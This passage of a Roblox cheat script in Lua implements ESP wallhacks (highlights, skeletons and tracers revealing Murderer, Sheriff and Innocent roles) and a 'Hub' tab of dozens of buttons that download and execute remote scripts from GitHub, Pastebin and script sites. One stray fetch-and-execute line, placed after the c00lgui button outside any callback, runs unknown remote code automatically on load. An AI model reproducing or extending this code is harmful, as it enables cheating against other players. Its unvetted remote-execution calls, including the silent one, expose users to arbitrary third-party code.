                hl.Parent = char
                hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                hl.FillTransparency = 1
                hl.OutlineTransparency = 0
                highlights[player] = hl
            end
            hl.OutlineColor = color
            hl.Enabled = true
        else
            if hl then
                hl.Enabled = false
            end
        end

        -- Prepare drawing objects
        if not drawingObjects[player] then
            drawingObjects[player] = {}
        end
        local obj = drawingObjects[player]

        -- Tracers ESP
        local showTracers = ESPSettings.Tracers[effective_role]
            or (effective_role == "Hero" and ESPSettings.Tracers.Sheriff)
            or false
        if showTracers then
            if not obj.tracer then
                obj.tracer = Drawing.new('Line')
                obj.tracer.Thickness = 2
            end
            obj.tracer.Color = color
            local root = char:FindFirstChild('HumanoidRootPart')
            if root then
                local pos = root.Position
                local screenpos, onscreen = Camera:WorldToViewportPoint(pos)
                if onscreen then
                    local center = Vector2.new(
                        Camera.ViewportSize.X / 2,
                        Camera.ViewportSize.Y
                    )
                    obj.tracer.From = center
                    obj.tracer.To = Vector2.new(screenpos.X, screenpos.Y)
                    obj.tracer.Visible = true
                else
                    obj.tracer.Visible = false
                end
            else
                obj.tracer.Visible = false
            end
        else
            if obj.tracer then
                obj.tracer.Visible = false
            end
        end

        -- Skeleton ESP
        local showSkeleton = ESPSettings.Skeleton[effective_role]
            or (effective_role == "Hero" and ESPSettings.Skeleton.Sheriff)
            or false
        if showSkeleton then
            if not obj.skeletonLines then
                obj.skeletonLines = {}
                for _ = 1, #boneConnections do
                    local line = Drawing.new('Line')
                    line.Thickness = 1
                    table.insert(obj.skeletonLines, line)
                end
            end
            for i, line in ipairs(obj.skeletonLines) do
                line.Color = color
            end
            for i, conn in ipairs(boneConnections) do
                local part1 = char:FindFirstChild(conn[1])
                local part2 = char:FindFirstChild(conn[2])
                if part1 and part2 then
                    local pos1 = part1.Position
                    local pos2 = part2.Position
                    local screen1, on1 = Camera:WorldToViewportPoint(pos1)
                    local screen2, on2 = Camera:WorldToViewportPoint(pos2)
                    if on1 and on2 then
                        obj.skeletonLines[i].From = Vector2.new(screen1.X, screen1.Y)
                        obj.skeletonLines[i].To = Vector2.new(screen2.X, screen2.Y)
                        obj.skeletonLines[i].Visible = true
                    else
                        obj.skeletonLines[i].Visible = false
                    end
                else
                    obj.skeletonLines[i].Visible = false
                end
            end
        else
            if obj.skeletonLines then
                for _, line in ipairs(obj.skeletonLines) do
                    line.Visible = false
                end
            end
        end
    end
end)

-- UI Toggles
-- Highlights ESP
Tabs.ESPTab:Toggle({
    Title = 'Innocent Highlights',
    Value = false,
    Callback = function(val)
        ESPSettings.Highlights.Innocent = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Murderer Highlights',
    Value = false,
    Callback = function(val)
        ESPSettings.Highlights.Murderer = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Sheriff/Hero Highlights',
    Value = false,
    Callback = function(val)
        ESPSettings.Highlights.Sheriff = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Dead Highlights',
    Value = false,
    Callback = function(val)
        ESPSettings.Highlights.DeadInnocent = val
    end,
})

Tabs.ESPTab:Divider()

-- Skeleton ESP
Tabs.ESPTab:Toggle({
    Title = 'Innocent Skeleton',
    Value = false,
    Callback = function(val)
        ESPSettings.Skeleton.Innocent = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Murderer Skeleton',
    Value = false,
    Callback = function(val)
        ESPSettings.Skeleton.Murderer = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Sheriff/Hero Skeleton',
    Value = false,
    Callback = function(val)
        ESPSettings.Skeleton.Sheriff = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Dead Skeleton',
    Value = false,
    Callback = function(val)
        ESPSettings.Skeleton.DeadInnocent = val
    end,
})

Tabs.ESPTab:Divider()

-- Tracers ESP
Tabs.ESPTab:Toggle({
    Title = 'Innocent Tracers',
    Value = false,
    Callback = function(val)
        ESPSettings.Tracers.Innocent = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Murderer Tracers',
    Value = false,
    Callback = function(val)
        ESPSettings.Tracers.Murderer = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Sheriff/Hero Tracers',
    Value = false,
    Callback = function(val)
        ESPSettings.Tracers.Sheriff = val
    end,
})
Tabs.ESPTab:Toggle({
    Title = 'Dead Tracers',
    Value = false,
    Callback = function(val)
        ESPSettings.Tracers.DeadInnocent = val
    end,
})
Tabs.Hub:Button({Title="Infinite Yield",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()end})
Tabs.Hub:Button({Title="Ghost Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()end})
Tabs.Hub:Button({Title="Nameless Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()end})
Tabs.Hub:Button({Title="CMD-X",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()end})
Tabs.Hub:Button({Title="Fates Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/source.lua"))()end})
Tabs.Hub:Button({Title="Orca",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()end})
Tabs.Hub:Button({Title="Epik Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Epik-Hub-Blox-Fruits-Fisch-Evade-and-More-23406"))()end})
Tabs.Hub:Button({Title="Ez Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Ez-Hub_168"))()end})
Tabs.Hub:Button({Title="Ultimate Hub V2",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Ultimate-Hub-V2-9718"))()end})
Tabs.Hub:Button({Title="Forge Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Forge-Hub-41461"))()end})
Tabs.Hub:Button({Title="Moldovan Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdminClassic/refs/heads/main/main.lua"))()end})
Tabs.Hub:Button({Title="Sky Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()end})
Tabs.Hub:Button({Title="Hydroxide",Callback=function()local o,b="Upbolt","revision"pcall(function()loadstring(game:HttpGet(("https://raw.githubusercontent.com/%s/Hydroxide/%s/init.lua"):format(o,b)))()loadstring(game:HttpGet(("https://raw.githubusercontent.com/%s/Hydroxide/%s/ui/main.lua"):format(o,b)))()end)end}) 
Tabs.Hub:Button({Title="Simple V3",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Simple-Scripts/main/Simple V3"))()end})
Tabs.Hub:Button({Title="Slicer FE V6",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Ahma174/Slicer/refs/heads/main/Slicer Fe V6"))()end})
Tabs.Hub:Button({Title="Hat Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()end})
Tabs.Hub:Button({Title="FE Punch",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexR32/FePunch/main/FePunch.lua"))()end})
Tabs.Hub:Button({Title="FE Godmode",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/fe-godmode.lua"))()end})
Tabs.Hub:Button({Title="Coquette Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Brookhaven-RP-Coquette-Hub-41921"))()end})
Tabs.Hub:Button({Title="JG Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/jg-hub-brookhaven-UDaT"))()end})
Tabs.Hub:Button({Title="Tiger X Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/tiger-x-hub-brookhaven-UDaT"))()end})
Tabs.Hub:Button({Title="Rael Hub (OP)",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/contateste8/OaOaOaOa-EbEbEbEbEb/main/RaelHubObf.txt"))()end})
Tabs.Hub:Button({Title="SP Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()end})
Tabs.Hub:Button({Title="GHub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/GHub/main/Brookhaven.lua"))()end})
Tabs.Hub:Button({Title="IceHub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/IceHubScripts/Brookhaven/main/script.lua"))()end})
Tabs.Hub:Button({Title="Sky Hub Jailbreak",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/new-jailbreak-script-sky-hub-auto-farm-teleports-kill-aura-silent-aim-vehicle-mods-infinite-nitro-nuke-open-all-doors-gates-and-cells-and-more-4208"))()end})
Tabs.Hub:Button({Title="Redz Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Scripts/refs/heads/main/main.luau"))({JoinTeam="Pirates",Translator=true})end})
Tabs.Hub:Button({Title="Speed Hub X",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/blox-fruits-or-speed-hub-x-keyless-GR6x"))()end})
Tabs.Hub:Button({Title="Ro Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/ro-hub-or-keyless-roblox-script-hub-xFgj"))()end})
Tabs.Hub:Button({Title="Org Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/org-hub-blox-fruit-script-NoK7"))()end})
Tabs.Hub:Button({Title="HoHo Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/blox-fruit-hoho-hub-2874"))()end})
Tabs.Hub:Button({Title="Min Hub V4",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Blox-Fruits-Min-Hub-V4-15545"))()end})
Tabs.Hub:Button({Title="Strike Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Strike-Hub-or-Blox-Fruits-or-Auto-Farm_71"))()end})
Tabs.Hub:Button({Title="Da Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Da-Hood-Da-Hub-2138"))()end})
Tabs.Hub:Button({Title="Da Hood OP Script",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/dah-hood-op-script-RXe2"))()end})
Tabs.Hub:Button({Title="LKHUB",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/lkhub-insane-script-hub-for-multiple-games-2528"))()end})
Tabs.Hub:Button({Title="Something Hub PSX",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/something-hub-%28-the-BEST-x-script-%29_234"))()end})
Tabs.Hub:Button({Title="Fly GUI V3",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()end})
Tabs.Hub:Button({Title="FE Invisible",Callback=function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-fe-invisible-OPEN-SOURCE-53560"))()end})
Tabs.Hub:Button({Title="Ketamine Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()end})
Tabs.Hub:Button({Title="c00lgui v2",Callback=function()loadstring(game:GetObjects("rbxassetid://16742906657")[1].Source)()end})  loadstring(game:HttpGet("https://raw.githubusercontent.com/DontTrlp/chatgpt/refs/heads/main/testhub"))()
Tabs.Hub:Button({Title="FE Telekinesis",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty13.lua"))()end})
Tabs.Hub:Button({Title="FE Fighter",Callback=function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Fighter-inspired-by-Gale-21557"))()end})
Tabs.Hub:Button({Title="Part Controller",Callback=function()pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PartController/refs/heads/main/PartController.lua",true))()end)end})
Tabs.Hub:Button({Title="FE Invisible Tool",Callback=function()loadstring(game:HttpGet("https://pastebin.com/raw/71bx8T3L"))()end})

local localPlayer = Players.LocalPlayer
StarterGui:SetCore("SendNotification", {
    Title = "Script Loaded",
    Text = "Welcome, " .. localPlayer.Name .. "! Script is Loaded, Enjoy!!",
    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. localPlayer.UserId .. "&w=150&h=150",
    Duration = 50,
    Button1 = "OK"
})